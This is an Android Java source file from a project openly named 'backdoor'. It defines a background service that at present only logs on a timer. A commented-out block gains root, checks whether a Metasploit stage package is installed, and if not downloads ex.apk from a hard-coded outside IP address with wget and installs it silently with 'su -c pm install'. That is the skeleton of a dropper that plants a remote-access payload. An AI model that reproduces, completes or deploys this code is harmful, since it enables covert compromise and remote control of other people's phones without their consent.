package com.voila.backdoor;
import android.app.*;
import android.content.*;
import android.os.Bundle;
import android.os.IBinder;
import android.util.*;
import java.io.*;
import java.util.*;

public class srv extends Service
{
	public srv()
	{}

	@Override
	public IBinder onBind(Intent p1)
	{
		// TODO: Implement this method
		Log.i("fuck","onBind");
		return null;
	}

	@Override
	public void onCreate()
	{
		Log.i("fuck","onCreate");

		// TODO: Implement this method
		super.onCreate();
	}
	//public static receiver r=new receiver();
	@Override
	public int onStartCommand(Intent intent, int flags, int startId)
	{
		Log.i("fuck","onStartCommand");
		Timer t=new Timer();
		TimerTask tt=new TimerTask(){

			@Override
			public void run()
			{
				//Intent i=new Intent(srv.this,srv.class);
				//startService(i);
				Log.i("fuck","start");
				// TODO: Implement this method
			}
		};
		t.schedule(tt,2000,2000);
		/*
		while(true)
		{
			Log.i("fuck","thread");

			try
			{
				Thread.sleep(2000);
			}catch(InterruptedException e)
			{}
		}
		*/
		/*
		new Thread(){
			@Override
			public void run()
			{
				
				
			}
		}.run();
		*/
		/*
		try
		{
			Process p=Runtime.getRuntime().exec("su");
			DataOutputStream os=new DataOutputStream(p.getOutputStream());
			os.writeBytes("pm list package\n");
			os.flush();
			os.close();
			BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
			String line=null;
			StringBuffer sb=new StringBuffer();
			while((line=br.readLine())!=null)
			{
				sb.append(line).append("\n");
			}
			if(sb.indexOf("com.metasploit.stage")==-1)
			{
				p=Runtime.getRuntime().exec("wget http://129.28.68.123/ex.apk -O /data/user/0/com.voila.backdoor/files/ex.apk");
				p.waitFor();
				p=Runtime.getRuntime().exec("su -c pm install /data/user/0/com.voila.backdoor/files/ex.apk");
			}
		}catch(Exception e)
		{}
		*/
		return super.onStartCommand(intent,flags,startId);
	}
}
